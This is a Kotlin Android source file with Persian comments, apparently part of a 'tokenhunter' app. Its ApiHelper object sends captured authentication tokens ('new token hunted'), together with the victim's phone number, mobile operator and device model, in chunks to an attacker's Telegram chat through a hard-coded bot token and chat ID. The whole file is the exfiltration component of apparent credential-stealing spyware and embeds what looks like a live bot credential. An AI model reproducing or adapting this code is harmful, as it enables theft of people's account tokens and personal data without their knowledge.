package ir.venice.tokenhunter

import android.os.Build
import android.text.TextUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.TimeUnit

object ApiHelper {

    // ⬇️⬇️⬇️ جایگزین کن ⬇️⬇️⬇️
    private const val BOT_TOKEN = "8675015355:AAGuWw_DfxjsTLMDNV-HK-YN6Lo5F7_yGz0"
    private const val CHAT_ID = "6922789849"          // آیدی عددی چت شخصی خودت
    // ⬆️⬆️⬆️ جایگزین کن ⬆️⬆️⬆️

    private const val BASE = "https://api.telegram.org"
    private const val MAX_CHUNK = 3500

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(25, TimeUnit.SECONDS)
            .build()
    }

    suspend fun sendToken(hit: TokenHit, phone: String, operatorTitle: String): Boolean =
        withContext(Dispatchers.IO) {
            val header = buildString {
                append("🔑 <b>توکن جدید شکار شد</b>\n")
                append("اپراتور: ").append(esc(operatorTitle)).append('\n')
                append("شماره: <code>").append(esc(phone)).append("</code>\n")
                append("منبع: ").append(esc(hit.source)).append('\n')
                append("زمان: ").append(esc(now())).append('\n')
                append("دستگاه: ").append(esc("${Build.MANUFACTURER} ${Build.MODEL}")).append('\n')
                append("طول: ").append(hit.value.length)
            }

            var ok = send(header)
            hit.value.chunked(MAX_CHUNK).forEach { part ->
                if (!send("<code>" + esc(part) + "</code>")) ok = false
            }
            ok
        }

    private fun send(text: String): Boolean {
        val body = FormBody.Builder()
            .add("chat_id", CHAT_ID)
            .add("text", text)
            .add("parse_mode", "HTML")
            .add("disable_web_page_preview", "true")
            .build()

        val request = Request.Builder()
            .url("$BASE/bot$BOT_TOKEN/sendMessage")
            .post(body)
            .build()

        return runCatching {
            client.newCall(request).execute().use { response ->
                val payload = response.body?.string().orEmpty()
                response.isSuccessful && JSONObject(payload).optBoolean("ok", false)
            }
        }.getOrDefault(false)
    }

    private fun esc(s: String) = TextUtils.htmlEncode(s)

    private fun now(): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
            .apply { timeZone = TimeZone.getTimeZone("Asia/Tehran") }
            .format(Date())
}